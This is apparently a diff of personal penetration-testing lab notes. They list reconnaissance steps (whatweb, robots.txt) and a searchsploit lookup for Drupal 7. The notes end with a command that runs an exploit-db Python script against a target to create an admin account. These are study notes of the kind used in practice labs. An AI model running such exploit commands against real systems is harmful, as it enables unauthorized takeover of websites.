@@ -47,12 +47,25 @@ if theres 80, open it up in browser
 whatweb [targetIP]
 
 # don't forget to check the robot.txt
-go to browser and type in url "[targetIP]/robot.txt"
+#go to browser and type in url "
+[targetIP]/robot.txt
 
 # look for useful info
 
-# look for vulnerabilities using searchploit
-searchploit Drupal 7
+# look for vulnerabilities using searchploit, the video shows the technology "drupal 7"
+searchploit drupal 7 > result shows the exploit title and path 
+
+# Launch the python script showed in searchploit
+python /usr/share/exploitdb/exploits/php/webapps/34992.py -u syberoffense -p Password123! -t http://[targetIP]
+
+
+
+
+
+
+
+
+
 
 
 
